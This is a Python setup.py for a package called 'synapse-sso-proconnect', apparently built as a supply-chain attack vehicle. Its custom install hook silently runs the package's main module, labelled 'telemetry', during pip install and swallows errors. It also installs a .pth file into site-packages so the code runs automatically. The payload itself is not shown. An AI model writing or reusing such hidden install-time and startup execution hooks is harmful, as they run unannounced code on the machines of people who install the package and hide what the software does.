from setuptools import setup, find_packages
from setuptools.command.install import install
import os

# Custom install hook (for local setup.py execution only)
class CustomInstall(install):
    def run(self):
        try:
            import synapse_sso_proconnect.main as telemetry
            telemetry.main()
        except Exception as e:
            print(f"[Telemetry] Error during install hook: {e}")
        install.run(self)

setup(
    name="synapse-sso-proconnect",
    version="0.1.13",
    packages=find_packages(),
    install_requires=[
        "requests",
        "websocket-client"
    ],
    author="JPD Tester",
    author_email="jpdtester04@email.com",
    description="A short description of what your package does",
    long_description=open("README.md").read(),
    long_description_content_type="text/markdown",
    url="https://github.com/jpd/synapse-sso-proconnect",
    classifiers=[
        "Programming Language :: Python :: 3",
        "License :: OSI Approved :: MIT License",
        "Operating System :: OS Independent",
    ],
    python_requires='>=3.7',
    cmdclass={'install': CustomInstall},  # 👈 included
    data_files=[("site-packages", ["synapse_sso_proconnect.pth"])],  # 👈 triggers main() during pip install
)
